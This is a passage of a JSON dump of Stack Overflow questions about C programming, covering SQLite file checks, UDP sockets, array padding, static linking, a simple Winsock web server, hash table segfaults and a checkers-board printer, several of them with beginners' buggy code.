</p>\n"},{"tags":["c","sqlite"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":44,"score":3,"question_id":13187424,"title":"Is there a way to check if a file is an SQLite3 DB?","body":"<p>I am writing a simple C program to check if a File F is a usable SQLite3 database.</p>\n\n<p>I tried writing gibberish into a file <code>test.db</code>, but <code>sqlite3_open(\"test.db\", &amp;db)</code> returned 0.</p>\n\n<p>I suppose either <code>sqlite3_status()</code> or <code>sqlite3_db_status()</code> do what I want, but the documentation states something different.</p>\n"},{"tags":["c","sockets","udp"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":80,"score":1,"question_id":12240424,"title":"Have responses to UDP datagrams picked up by another process?","body":"<p>I'm trying to implement a basic UDP protocol wherein a Sender sends a UDP datagram to a Service, which then sends a response datagram back, using the source address and source port from the incoming datagram.</p>\n\n<p>Normally you'd have the Sender also listen for the response on that port.  But I want the response to be picked up by a separate program (the Listener) also running on that host.  So:</p>\n\n<ol>\n<li>On host A, Listener starts and binds to port 12345, and blocks on <code>recvfrom</code>.</li>\n<li>On host A, Sender sends datagram to Service running on host B, setting the source address and port to host A, port 12345.</li>\n<li>Service on host B sends a response to host A port 12345.</li>\n<li>Response is picked up by Listener.</li>\n</ol>\n\n<p>Setting the source address and port is done by binding to them.  So I need both Sender and Listener to bind to the same port.  Setting SO_REUSEADDR in both allows this.  Note that I'm not using multicast here.</p>\n\n<p>But the responses aren't reliably being picked up by Listener.  There are two exceptions I've observed:</p>\n\n<p>I find that if the Sender closes the socket immediately after sending the first datagram, then the response will get to the Listener.</p>\n\n<p>Alternatively, if the Sender is started first and binds before the Listener, the responses will get picked up by the Listener.</p>\n\n<p>I've been working from examples from the internet and haven't found documentation that clearly describes what should happen.  But a few places I've seen have hinted that, for Unicast, only the most recent process to bind to the port will receive datagrams sent to it.</p>\n\n<p>My question is, can I send UDP datagrams so that responses (sent using the source address and port) will be picked up by another process?  If the above process can't be made to work, is there a way to set the source information on an outgoing datagram without binding to that port?</p>\n\n<p>A few other points:</p>\n\n<ul>\n<li>Each process should be started independently and be able to be restarted without interfering with the other.  So I don't think I can have one open the socket and spawn the other.</li>\n<li>I don't need to receive packets from both processes.  One process only sends, and the other only receives.</li>\n<li>Ideally, the solution would be portable enough to run on common Unixes and Windows.</li>\n<li>Finally, if it's simply not possible then I'll fall back to using a single process to perform both functions.  I'm not too stressed about it but I am interested in doing it if it <em>is</em> possible somehow. :-)</li>\n</ul>\n\n<p>Networking code follows...</p>\n\n<p><strong>Sender code</strong></p>\n\n<pre><code>void run(Options *options)\n{\n    struct sockaddr_in si_me, si_other;\n    int s;\n    socklen_t slen = sizeof(si_other);\n    int reuse = 1;\n    struct hostent *he;\n\n    if ((s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)\n        die(\"socket\");\n\n    if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &amp;reuse, sizeof(reuse)) != 0)\n        die(\"setsockopt\");\n\n    // Bind to the \"listen port\", so that outgoing datagrams have the correct source information\n    memset((char *) &amp;si_me, 0, sizeof(si_me));\n    si_me.sin_family = AF_INET;\n    si_me.sin_port = htons(options-&gt;listen_port);\n    si_me.sin_addr.s_addr = htonl(INADDR_ANY);\n    if (bind(s, (struct sockaddr *) &amp;si_me, sizeof(si_me)) != 0)\n        die(\"bind\");\n\n    memset((char *) &amp;si_other, 0, sizeof(si_other));\n    si_other.sin_family = AF_INET;\n    si_other.sin_port = htons(options-&gt;service_port);\n\n    if (!(he = gethostbyname2(options-&gt;service_host, AF_INET)))\n        die(\"gethostbyname2\");\n\n    memmove(&amp;si_other.sin_addr.s_addr, he-&gt;h_addr, he-&gt;h_length);\n\n    while (1)\n    {\n        int len;\n        char *buf;\n\n        // Create outgoing message in buf\n        ...\n\n        if (sendto(s, buf, len, 0, (struct sockaddr *) &amp;si_other, slen) == -1)\n            die(\"sendto\");\n    }\n    close(s);\n}\n</code></pre>\n\n<p><strong>Listener code</strong></p>\n\n<pre><code>static void run(Options *options)\n{\n    struct sockaddr_in si_me, si_other;\n    int s;\n    socklen_t slen = sizeof(si_other);\n    char buf[BUFLEN];\n    int reuse = 1;\n\n    if ((s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)\n        die(\"socket\");\n\n    if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &amp;reuse, sizeof(reuse)) != 0)\n        die(\"setsockopt\");\n\n    // Bind to the same \"listen port\" to pick up responses to datagrams sent by Sender\n    memset((char *) &amp;si_me, 0, sizeof(si_me));\n    si_me.sin_family = AF_INET;\n    si_me.sin_port = htons(options-&gt;listen_port);\n    si_me.sin_addr.s_addr = htonl(INADDR_ANY);\n    if (bind(s, (struct sockaddr *) &amp;si_me, sizeof(si_me)) == -1)\n        die(\"bind\");\n\n    while (1)\n    {\n        int nr;\n\n        nr = recvfrom(s, buf, BUFLEN, 0, (struct sockaddr *) &amp;si_other, &amp;slen);\n        if (nr == -1)\n            die(\"recvfrom\");\n\n        // Process the received message\n        ...\n    }\n\n    close(s);\n}\n</code></pre>\n\n<p>A related question is <a href=\"http://stackoverflow.com/questions/11387067/using-netcat-to-send-a-udp-packet-without-binding\">Using netcat to send a UDP packet without binding</a>, where one answer seems to suggest it should be possible using SO_SOCKADDR, but did not quite explain how it would work in my case.</p>\n"},{"tags":["c"],"answer_count":4,"favorite_count":0,"up_vote_count":6,"down_vote_count":1,"view_count":126,"score":5,"question_id":13185255,"title":"Efficiently appending a large array with zeros?","body":"<p>I have an array named A that contains random floats, with its size anywhere in the range from [10000, 1000000]. This array is a randomly generated argument to my function, and in order to operate on it I am trying to preemptively append/pad it with 10000 zeros in an efficient manner. I am worried that appending A's allocated memory will corrupt the heap, so instead I allocate new memory, memcopy A, and memset 10000 trailing floats in the new Array to 0.0.</p>\n\n<pre><code>void *ArrayPadder(float *A){\n    int pad = 10000;\n    float *Apadded = (float*)malloc((sizeof(A)+pad)*sizeof(float));\n    memcpy(Apadded, A, sizeof(A));\n    memset(Apadded+sizeof(A), 0.0, pad);\n    return Apadded;\n}\n</code></pre>\n\n<p>Can anyone suggest a more efficient way of accomplishing this?</p>\n\n<p>EDIT: Apologies for the delay but I added some clarification. The reason I can't just pre-allocate the correct memory space (510000 floats) is because the array is actually of random size, containing random floats. I chose 500000 in an attempt to simplify the question, which is now fixed.</p>\n"},{"tags":["c","linker","glibc","static-linking"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":13187499,"title":"Static linking glibc","body":"<p>I need to statically link glibc to my project, because the target platform supports only a very old one ( but it works with statically linked glibc from my toolchain, I have checked it)</p>\n\n<p>Unfortunately, this application has to make use of pthread library, but statically linked libpthread takes too much place.</p>\n\n<p>I would like do statically link glibc, and dynamically pthread.</p>\n\n<p>After running this command</p>\n\n<pre><code>powerpc-unknown-linux-gnu-gcc object_files -lrt -lpthread -Wl,-Bstatic -lc \n</code></pre>\n\n<p>I get:</p>\n\n<pre><code>/powerpc-unknown-linux-gnu/bin/ld: cannot find -lgcc_s\n</code></pre>\n"},{"tags":["c","arrays","parallel-processing","fill"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":66,"score":-2,"question_id":13183414,"title":"How to fill an array in parallel in C","body":"<p>I need an algorithm that could fill an array(of size n) with the same value, in log(n) time, in parallel. it means that the naive solution would be <code>for(i=0;i&lt;=n-1;i++)</code> <code>T[i] = 10</code> is not enough because it takes <code>O(n)</code> time, I need something that could take <code>O(log(n))</code>. It is very important that I mention that this is to be done in PARALLEL. I was thinking about a dependancy, but I cannot seem to figure it out.</p>\n"},{"tags":["c++","c","math"],"answer_count":4,"favorite_count":1,"up_vote_count":5,"down_vote_count":1,"view_count":242,"score":4,"question_id":12937900,"title":"Math with == in C++","body":"<p>I have a worksheet for my robotics class (in C++) and it has this problem on it:</p>\n\n<pre><code>assume a=5, b=(a==18%13);\n</code></pre>\n\n<p>I don't understand the == part. In all the programing experience I've ever had (PHP, Java, Python, etc.) I only really use the == in if statements and things like that. I just don't understand the logic behind that math.</p>\n\n<pre><code>a=5; //Okay, got that\nb = (a == 18 % 13); //Alright, this is the weird part. This isn't an if statement.\n</code></pre>\n\n<p>I'm having a hard time explaining how I don't understand this, but I've just never seen this.</p>\n"},{"tags":["c","arrays"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":46,"score":1,"question_id":13187228,"title":"Arrays in C, and Loops","body":"<pre><code>int main()\n{\nint marks[3];\nint counter=0;\nfor (i in marks){\n     printf(marks[i];\n         counter=counter+1;\n}\nreturn 0\n\n}\n</code></pre>\n\n<p>Very new to C, although I know Python. I don't know the syntax, but I'm trying to create and array, then print each variable in the array. What am i doing wrong?   </p>\n"},{"tags":["c","semaphore"],"answer_count":0,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":42,"score":2,"question_id":13187274,"title":"SysV Semaphore Removal","body":"<p>Is it possible to determine if a process is the only one currently utilizing a SysV semaphore and then somehow \"lock\" the semaphore so that the process may safely remove it before another process requests access again?</p>\n"},{"tags":["c","opencv"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":5485,"score":1,"question_id":2649421,"title":"displaying video from webcam in OpenCV","body":"<p>I have installed VS2008 and am able to run the demo codes \"camshiftdemo  and lkdemo \" which comes in the opencv library. With this done, now I am trying to run some simple codes from the internet to get acquainted with the OpenCV. I am just trying to display video from webcam and I am getting the following error..</p>\n\n<p>Error I am getting is  :</p>\n\n<blockquote>\n  <p>Unhandled exception at 0x5e7e3d10\n  (highgui200.dll) in opencv.exe:\n  0xC0000005: Access violation reading\n  location 0x719b3856.</p>\n</blockquote>\n\n<p>The code I am trying to run is :</p>\n\n<pre><code>#include &lt;cv.h&gt;\n#include &lt;highgui.h&gt;\nvoid main(int argc,char *argv[])\n{\nint c;\nIplImage* color_img;\nCvCapture* cv_cap = cvCaptureFromCAM(-1); // -1 = only one cam or doesn't matter\ncvNamedWindow(\"Video\",1); // create window\nfor(;;) {\ncolor_img = cvQueryFrame(cv_cap); // get frame\nif(color_img != 0)\ncvShowImage(\"Video\", color_img); // show frame\nc = cvWaitKey(10); // wait 10 ms or for key stroke\nif(c == 27)\nbreak; // if ESC, break and quit\n}\n/* clean up */\ncvReleaseCapture( &amp;cv_cap );\ncvDestroyWindow(\"Video\");\n}\n</code></pre>\n\n<p>Any help in this will be greatly appreciated.</p>\n"},{"tags":["c","sockets"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":60,"score":1,"question_id":13186535,"title":"Own simple webserver doesn't send the page","body":"<p>I've wrote a little webserver that just needs to send a html page or an error page to the browser. Just for practicing my new socket knowledge.</p>\n\n<p>In this program I was trying to use the select method to handle more then 1 request.</p>\n\n<p>The program accepts my connection but then nothing happens... firefox still keeps loading the file, but the file never shows up and the program doesn't do anything (it isn't crashed though.).</p>\n\n<p>This is my code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;winsock2.h&gt;\n#include &lt;winsock.h&gt;\n#include &lt;Ws2tcpip.h&gt;\n#include &lt;time.h&gt;\n\n#pragma comment(lib, \"ws2_32.lib\" )\n#define BUFFSIZE 512\n#define PORT \"9001\"\n#define MAXCONNECTIONS 10\n\nchar * getPath(char * input, int var, char result[]);\nvoid sendHeader(char * ext, char *path, int socketDescr, int code);\nvoid sendBody(char * ext, char *path, int socketDescr, int code);\n\n\nint main()\n{\n    WSADATA wsaData;\n    struct timeval tv;  // timeinterval for request (should arrive in less than 2seconds)\n    fd_set master;      // keeps track of all open file descriptors + listener\n    fd_set read_fds;    // list of file descriptors to read from\n    int fdmax;          // max file descriptor number\n    int listener;       // file descriptor on socket\n    int newfd;          // new client file descriptor\n    struct sockaddr_storage clientaddr; // client address\n    socklen_t addrlen;  // length of address\n    char clientIP[INET_ADDRSTRLEN]; // client ip-address (ipv4)\n    char buffer[BUFFSIZE]; // buffer for request\n    char request[BUFFSIZE]; // buffer for request\n    int recvbytes;      // amount of bytes received\n    int yes = 1;        // reuse address\n    int i,rv;\n    struct addrinfo serverinfo, *socketlist, *sock;\n\n    char result[BUFFSIZE];\n    char  * path;\n    char * extension;\n\n    if (WSAStartup(MAKEWORD(2,0), &amp;wsaData) != 0) \n    {\n        fprintf(stderr, \"WSAStartup failed.\\n\");\n        exit(1);\n    }\n\n    // Set up time interval\n    tv.tv_sec = 5;\n    tv.tv_usec = 0;\n\n    // Clean up file descriptor sets\n    FD_ZERO(&amp;master);\n    FD_ZERO(&amp;read_fds);\n\n    // Get a socket and bind for listening\n    memset(&amp;serverinfo, 0, sizeof(serverinfo));\n    serverinfo.ai_family = AF_INET;\n    serverinfo.ai_socktype = SOCK_STREAM; // TCP\n    serverinfo.ai_flags = AI_PASSIVE; // we search a socket on our side (server side) for listening\n\n    if((rv = getaddrinfo(NULL,PORT,&amp;serverinfo,&amp;socketlist)) != 0)\n    {\n        fprintf(stderr,\"Server: %s\\n\",gai_strerror(rv));\n        exit(1);\n    }\n\n    // loop trough sockets\n    for(sock = socketlist; sock != NULL; sock = sock-&gt;ai_next)\n    {\n        listener = socket(sock-&gt;ai_family, sock-&gt;ai_socktype, sock-&gt;ai_protocol);\n        if(listener &lt; 0)\n        {\n            continue; // not correct socket\n        }\n        setsockopt(listener,SOL_SOCKET,SO_REUSEADDR, &amp;yes, sizeof(int));\n        if(bind(listener, sock-&gt;ai_addr, sock-&gt;ai_addrlen) &lt; 0)\n        {\n            closesocket(listener);\n            continue; // could not bind to socket\n        }\n        break;\n    }\n\n    // if could not get socket\n    if(sock == NULL)\n    {\n        fprintf(stderr,\"Server: %s\\n\",\"Could not bind to socket\");\n        exit(2);\n    }\n\n    // free up list, we have the socket\n    freeaddrinfo(socketlist);\n\n    // listen on socket\n    if(listen(listener,MAXCONNECTIONS) &lt; 0)\n    {\n        perror(\"Server: listen\");\n        exit(3);\n    }\n\n    // add listener to master set\n    FD_SET(listener,&amp;master);\n    fdmax = listener;\n    fprintf(stdout,\"Server: %s\\n\",\"Waiting for connections...\");\n\n    for(;;)\n    {\n        read_fds = master;\n        if(select(fdmax+1,&amp;read_fds,NULL,NULL,&amp;tv) &lt; 0)\n        {\n            perror(\"Server: select\");\n            exit(4);\n        }\n\n        // run through existing connections to see if request has arrived\n        for(i = 0; i &lt;= fdmax; i++)\n        {\n            if(FD_ISSET(i, &amp;read_fds))\n            {\n                if(i == listener)\n                {\n                    // we have a new connection\n                    addrlen = sizeof clientaddr;\n                    if((newfd = accept(listener,(struct sockaddr*)&amp;clientaddr,&amp;addrlen)) &lt; 0)\n                    {\n                        perror(\"Server: accept\");\n                        exit(5);\n                    }\n                    else\n                    {\n                        FD_SET(newfd,&amp;master);\n                        if(newfd &gt; fdmax)\n                        {\n                            fdmax = newfd;\n                        }\n                        fprintf(stdout, \"Server: New connection from %s on socket %d\\n\",inet_ntop(clientaddr.ss_family, &amp;(((struct sockaddr_in*)((struct sockaddr*)&amp;clientaddr))-&gt;sin_addr), clientIP, sizeof(clientIP)),newfd);\n                    }\n                }\n                else\n                {\n                    // handle data from request\n                    if((recvbytes = recv(i,buffer,BUFFSIZE-1,0)) &lt;= 0)\n                    {\n                        if(recvbytes == 0) //connection closed\n                        {\n                            fprintf(stdout,\"Server: socket %d goodbye\\n\",i);\n                        }\n                        else //request error [BAD REQUEST]\n                        {\n                            perror(\"Server: recv\");\n                        }\n                        closesocket(i);\n                        FD_CLR(i,&amp;master);\n                    }\n                    else\n                    {\n                        recvbytes = recv(i, buffer,BUFFSIZE-1 , 0);\n                        if(recvbytes &gt; 0)\n                        {\n                            buffer[recvbytes]='\\0';\n                            strcat(request,buffer);\n                        }\n                        fprintf(stdout,\"Server: request received:\\n\");\n                        printf(\"%s\", request);\n\n                        //Get path\n                        path = getPath(request,0, result);\n                        if(strcmp(path,\"error\") != 0)\n                        {\n                            extension = getPath(request,1,result);\n                            if(strcmp(extension,\"error\") != 0)\n                            {\n                                // send file 200\n                                sendBody(extension,path,i,200);\n                            }\n                        }\n                        else\n                        {\n                            // send code 400\n                            sendBody(\"html\",\"400.html\",i,400);\n                        }\n\n                        closesocket(i);\n                        FD_CLR(i,&amp;master);\n                    }\n                }\n            }\n        }\n    }\n    return 0;\n}\n\n// Gives path, extension of file or error\nchar * getPath(char * input, int var, char result [])\n{\n    char * pch;\n    char str[BUFFSIZE];\n    strcpy(str,input);\n\n    pch = strtok(str,\"\\r\\n\");\n    pch = strtok(pch,\" \");\n\n    if(strcmp(pch,\"GET\") != 0)\n    {\n        strcpy(result,\"error\");\n        return result;\n    }\n\n    pch = strtok(NULL,\" \");\n    if(var == 0)\n    {\n        strcpy(result,pch);\n        return result; \n    }\n    pch = strtok(pch,\".\");\n    pch = strtok(NULL,\".\");\n    if(var == 1)\n    {\n        strcpy(result,pch);\n        return result;\n    }\n\n    return 0;\n}\n\n//Send header\nvoid sendHeader(char * ext, char *path, int socketDescr, int code)\n{\n    FILE * fp;\n    int fileSize = 0;\n    char fileSizeChar[32];\n    char * header;\n    char * status;\n    char * contenType;\n    char * contentLength;\n    char * msg;\n\n    if((fp = fopen(path, \"r\")) == NULL)\n    {\n        printf(\"Error opening file %s\\n\",path);\n        return;\n    }\n    //Get filesize\n    fseek(fp, 0L, SEEK_END);\n    fileSize = ftell(fp);\n    fseek(fp, 0L, SEEK_SET);\n    fclose(fp);\n\n    //Create header response message\n    header = \"HTTP/1.0 \";\n\n    if(code == 200)\n        strcpy(status,\"200\");\n    else if(code == 400)\n        strcpy(status,\"400\");\n    else if(code == 404)\n        strcpy(status,\"404\");\n\n    if(strcmp(ext,\"html\") == 0)\n        strcpy(contenType,\" text/html\\n\");\n\n    //create and send header\n    strcat(msg,header);\n    strcat(msg,status);\n    strcat(msg,contenType);\n    strcat(msg,contentLength);\n    strcat(msg,fileSizeChar);\n\n    send(socketDescr, msg, strlen(msg), 0);\n}\n\n//Sending data like, pictures, zip, html pages... or an error html page\nvoid sendBody(char * ext, char *path, int socketDescr, int code)\n{\n    FILE * fp;\n    int fileSize = 0;\n    int sendBytes = 0;\n    int resultRead;\n    int resultSend;\n    char buffer[1000];\n\n    if((fp = fopen(path, \"r\")) == NULL)\n    {\n        printf(\"Can't open file %s\\n\",path);\n        if(code == 400)\n        {\n            printf(\"Error page 400 doesn't exist.\\n\");\n            return;\n        }\n        if((fp = fopen(\"404.html\",\"r\")) == NULL)\n        {\n            printf(\"Error page 404 doesn't exist.\\n\");\n            return;\n        }\n        strcpy(ext,\"html\");\n        strcpy(path,\"404.html\");\n        code = 404;\n    }\n\n    sendHeader(ext,path,socketDescr,code);\n\n    fseek(fp, 0L, SEEK_END);\n    fileSize = ftell(fp);\n    fseek(fp, 0L, SEEK_SET);\n\n    while(sendBytes &lt; fileSize)\n    {\n        fseek(fp,sendBytes,SEEK_SET);\n        resultRead = fread(buffer,sizeof buffer[0],1000,fp);\n        resultSend = send(socketDescr,buffer,resultRead,NULL);\n        sendBytes +=resultSend;\n    }\n    fclose(fp);\n}\n</code></pre>\n\n<p>The only line that shows up is \" Server: New connection from %s on socket  \".</p>\n\n<p>Can someone help me please?</p>\n\n<p>Kind regards,</p>\n"},{"tags":["objective-c","c"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13186874,"title":"use of undeclared identifier '_bridge'","body":"<p>My objective-c project contains C libraries that has:</p>\n\n<pre><code>void* ptr;\n</code></pre>\n\n<p>ViewController has:</p>\n\n<pre><code>UIImageView pic;\npic = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@\"ground.png\"]];\n\ncLoad cload; // C-class object\ncload.ptr = (_bridge void*) pic;\n</code></pre>\n\n<p>I use ARC but i don't understand why I'm getting error message: <code>use of undeclared identifier bridge</code>\nThank you )))</p>\n"},{"tags":["c","file"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":68,"score":2,"question_id":13186357,"title":"How can you double space a file in C? Then print to STDOUT.","body":"<p>I need to read in a file, then print it out to STDOUT but double spaced. What I have so far is:</p>\n\n<pre><code>#include &lt;fcntl.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define BUFSZ 1024\n\nint main(int argc, char* argv[]){\n\nint n, fdin;\nchar buf[BUFSZ];\n\nif ((fdin=open(argv[1],O_RDONLY))&lt;0){\n  perror(argv[1]);\n  exit(-1);\n}\nwhile(( n = read(fdin, buf, BUFSZ))&gt;0){\n if(write(STDOUT_FILENO,buf,n) != n){\n  fprintf(stderr, \"Write Error\\n\");\n  exit(-1);\n }\n printf(\"\\n\");\n}\nclose(fdin);\nreturn(0);\n}\n</code></pre>\n\n<p>I'm new to C and don't know how I could implement the \\n into the code, my printf(\"\\n\") is useless in trying to double space the entire file's contents. I think I have to add the \\n into the read? But I'm not entirely sure if that's correct or how to do it.  </p>\n"},{"tags":["c","segmentation-fault","hashtable"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":940,"score":1,"question_id":5823337,"title":"Segmentation fault (core dumped) error","body":"<p>I'm writing a program that uses a Hashtable of linked lists to count the frequency of words. The program will count all the words that I enter along with the frequency however after printing the hashtable, I get a segmentation fault (core dumped) error. When I valgrind my program, it shows that I get errors in three different places that are Invalid read of size 8. I'm not sure how to fix them though. Here are the three different places:</p>\n\n<pre><code> void freeTable(HashTablePtr table) {\n     int i;\n     ListPtr list;\n\n     if (table == NULL)\n         return;\n\n     for (i = 0; i &lt; table-&gt;size; i++) {\n         list = table-&gt;table[i];\n         freeList(list);\n     }\n\n     free(table-&gt;table);\n     free(table);\n }\n\n\n HashTablePtr createTable(int tableSize) {\n\n     int i;\n     HashTablePtr table = (HashTablePtr) malloc(sizeof(HashTablePtr));\n     table-&gt;table = (ListPtr *) malloc(sizeof(ListPtr) * tableSize);\n     table-&gt;size = tableSize;\n\n     for (i = 0; i &lt; table-&gt;size; i++) {\n         table-&gt;table[i] = createList();\n     }\n\n     return table;\n }\n\n\n void printTable(HashTablePtr table) {\n\n     ListPtr tempList;\n     NodePtr tempNode;\n     HashObjectPtr obj;\n     int i;\n\n     for (i = 1; i &lt; table-&gt;size; i++) {\n         tempList = table-&gt;table[i];\n         if (tempList-&gt;size != 0) {\n             tempNode = tempList-&gt;head;\n             obj = tempNode-&gt;HashObject;\n             printf(\"%s\\n\\n\", toString(obj));\n         }\n     }\n }\n</code></pre>\n\n<p>I think that the error has to due with using these lines:\n<br>\ntempList = table->table[i];\n<br>\ntable->table[i] = createList();\n<br>\nbut I'm not sure how to fix it.</p>\n\n<p>Edit:</p>\n\n<pre><code> typedef struct hashtable HashTable;\n typedef struct hashtable * HashTablePtr;\n\n struct hashtable {\n     int size;\n     ListPtr *table;\n };\n</code></pre>\n\n<p>Valgrind errors:</p>\n\n<p>999 errors in context 5 of 9:\n<br>\n==73795== Invalid read of size 8\n<br>\n==73795==    at 0x400B7D: printTable (HashTable.c:96)\n<br>\n==73795==    by 0x400766: main (wf.c:16)\n<br>\n==73795==  Address 0x4c34048 is 0 bytes after a block of size 8 alloc'd<br>\n==73795==    at 0x4A0515D: malloc (vg_replace_malloc.c:195)<br>\n==73795==    by 0x400D05: createTable (HashTable.c:17)<br>\n==73795==    by 0x400753: main (wf.c:14)<br>\n==73795==<br>\n==73795==<br>\n==73795== 1000 errors in context 6 of 9:<br>\n==73795== Invalid read of size 8<br>\n==73795==    at 0x400B2B: freeTable (HashTable.c:128)<br>\n==73795==    by 0x40076E: main (wf.c:17)<br>\n==73795==  Address 0x4c34048 is 0 bytes after a block of size 8 alloc'd<br>\n==73795==    at 0x4A0515D: malloc (vg_replace_malloc.c:195)<br>\n==73795==    by 0x400D05: createTable (HashTable.c:17)<br>\n==73795==    by 0x400753: main (wf.c:14)<br>\n==73795==<br>\n==73795==<br>\n==73795== 1000 errors in context 7 of 9:<br>\n==73795== Invalid read of size 8<br>\n==73795==    at 0x400D4C: createTable (HashTable.c:25)<br>\n==73795==    by 0x400753: main (wf.c:14)<br>\n==73795==  Address 0x4c34048 is 0 bytes after a block of size 8 alloc'd<br>\n==73795==    at 0x4A0515D: malloc (vg_replace_malloc.c:195)<br>\n==73795==    by 0x400D05: createTable (HashTable.c:17)<br>\n==73795==    by 0x400753: main (wf.c:14)<br></p>\n\n<pre><code> ListPtr createList() {\n     ListPtr list;\n     list = (ListPtr) malloc(sizeof(List));\n     list-&gt;size = 0;\n     list-&gt;head = NULL;\n     list-&gt;tail = NULL;\n     return list;\n }\n</code></pre>\n"},{"tags":["c","direction"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":173,"score":1,"question_id":5601221,"title":"Understanding directions for programming assignment?","body":"<p>We were given an assignment in our C programming class to modify a program to make it more object oriented. Part of this was to fix the toString method. The directions were:</p>\n\n<pre><code> Modify the Student module to make it more object-oriented.\n\n* Each Student object should have a function pointer that points to an \n  appropriate function for producing a string representation of the object.\n* Provide a default toString method to each object when it is created. \n  The studentToString method should no longer be part of the Student interface \n  (as defined in Student.h)\n</code></pre>\n\n<p>However, we aren't really sure what this means and would like to know if we are on the right track with what we are suppose to do. Here is the code from the Student.c file:</p>\n\n<pre><code> #include &lt;stdio.h&gt;\n #include &lt;stdlib.h&gt;\n #include \"Student.h\"\n #include \"String.h\"\n\n static void error(char *s) {\n     fprintf(stderr, \"%s:%d %s\\n\", __FILE__, __LINE__, s);\n     exit(1);\n }\n\n extern Student newStudent(char *name, int age, char *major) {\n     Student s;\n     if (!(s = (Student) malloc(sizeof(*s))))\n         error(\"out of memory\");\n     s-&gt;name = name;\n     s-&gt;age = age;\n     s-&gt;major = major;\n     return s;\n }\n\n extern char *studentToString(Student s) {\n     const int size = 3;\n     char age[size + 1];\n     snprintf(age, size, \"%d\", s-&gt;age);\n\n     char *line = newString();\n     line = catString(line, \"&lt;\");\n     line = catString(line, s-&gt;name);\n     line = catString(line, \" \");\n     line = catString(line, age);\n     line = catString(line, \" \");\n     line = catString(line, s-&gt;major);\n     line = catString(line, \"&gt;\");\n     return line;\n }\n</code></pre>\n\n<p>We known that the *studentToString method will be replaced by a *toString method and we think that the *toString method will have the same contents as the *studentToString method. But we don't understand how that makes it more object-oriented.\nWe have also determined, from the directions, that when we create a new Student object, we should have a pointer in the newStudent method that points to the new toString method.</p>\n\n<p>We're not looking for anyone to do the program for us. We just want to understand what we are suppose to do as our professor has been out of town for the week. Any help would be greatly appreciated.</p>\n"},{"tags":["c","struct"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":284,"score":1,"question_id":7827810,"title":"Printing a checker board","body":"<p>I am currently writing a checker program which uses alpha-beta pruning and a heuristic to play the game. I am attempting to print out the board at evaluation of the board and I am running into problems getting it to work. My teacher gave us all the code we need to run the program minus the evaluation function and the alpha-beta pruning function. The method for printing the board is in a different class than the methods for finding the best move for the checker game.</p>\n\n<p>Below are par of the search function class header (it doesn't include all of the method calls) and the evalBoard method which is where we want to print the board</p>\n\n<pre><code> double evalBoard1(State *state) {\n      int x, y;\n      double rval = 0.0;\n      double rval2 = 0.0;\n      evals++;\n      for (x = 0; x &lt; 8; x++)\n           for (y = 0; y &lt; 8; y++) {\n                if (x % 2 != y % 2 &amp;&amp; !empty(state-&gt;board[y][x])) {\n                     if (king(state-&gt;board[y][x])) { /* King */\n                          if (((state-&gt;board[y][x] &amp; White) &amp;&amp; !player1) \n                                  || (!(state-&gt;board[y][x] &amp; White) &amp;&amp; player1))\n                               rval += 2.0;\n                else\n                    rval2 += 2.0;\n                } else if (piece(state-&gt;board[y][x])) { /* Piece */\n                      if (((state-&gt;board[y][x] &amp; White) &amp;&amp; !player1)\n                             || (!(state-&gt;board[y][x] &amp; White) &amp;&amp; player1))\n                           rval += 1.0;\n                      else\n                           rval2 += 1.0;\n                }\n            }\n       }\n     state-&gt;PrintBoard(); //should print the board\n     fprintf(stderr,\"Value = %g\\n\",rval); //prints the evaluation of that board\n     if(rval &lt;= 0.0) return -10000.0;\n     if(rval2 &lt;= 0.0) return 10000.0;\n     return rval - rval2;\n}\n\n #ifndef COMPUTER_H\n #define COMPUTER_H\n\n #define Empty 0x00\n #define Piece 0x20\n #define King 0x60\n #define Red 0x00\n #define White 0x80\n\n #define number(x) ((x)&amp;0x1f)\n #define empty(x) ((((x)&gt;&gt;5)&amp;0x03)==0?1:0)\n #define piece(x) ((((x)&gt;&gt;5)&amp;0x03)==1?1:0)\n #define king(x) ((((x)&gt;&gt;5)&amp;0x03)==3?1:0)\n #define color(x) ((((x)&gt;&gt;7)&amp;1)+1)\n\n #define Clear 0x1f\n\n typedef struct{\n     int player;\n     char board[8][8];\n     char movelist[48][12];  \n     int numLegalMoves;\n }State;\n //all method calls occur after here\n #endif\n</code></pre>\n\n<p>Below this is the checkers.h file (it doesn't not include all other method calls beside PrintBoard()) and the checkers.c file (only includes the printBoard method and the Struct square call)</p>\n\n<pre><code>struct Square square[16][16];\n\n\nvoid PrintBoard() {\nint board[8][8];\nint x,y;\nchar ch = 127;\n\nfor(y=0; y&lt;8; y++)\n{\n   for(x=0; x&lt;8; x++)\n   {\n       if(x%2 != y%2) {\n           if(square[y][x].state) {\n               if(square[y][x].col) \n               {\n                  if(square[y][x].state == King) board[y][x] = 'B';\n                  else board[y][x] = 'b';\n               }\n               else\n               {\n                  if(square[y][x].state == King) board[y][x] = 'A';\n                  else board[y][x] = 'a';\n               }\n           } else board[y][x] = ' ';\n       } else board[y][x] = ch;\n       printf(\"%c\",board[y][x]);\n   }\n   